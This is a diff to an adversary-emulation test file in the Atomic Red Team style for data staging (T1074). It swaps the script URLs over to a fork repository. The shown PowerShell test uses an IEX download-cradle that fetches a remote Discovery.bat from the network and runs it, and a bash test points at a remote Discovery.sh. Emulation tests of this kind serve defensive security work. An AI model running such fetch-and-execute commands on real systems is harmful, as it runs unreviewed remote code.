@@ -14,7 +14,7 @@ atomic_tests:
     name: powershell
     elevation_required: false
     command: |
-      IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat')
+      IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1074/src/Discovery.bat')
 
 - name: Stage data from Discovery.sh
   description: |
@@ -28,7 +28,7 @@ atomic_tests:
     script_url:
       description: URL of the script
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh
+      default: https://raw.githubusercontent.com/arnoldmw/thremulate/master/art/atomics/T1074/src/Discovery.sh
 
   executor:
     name: bash
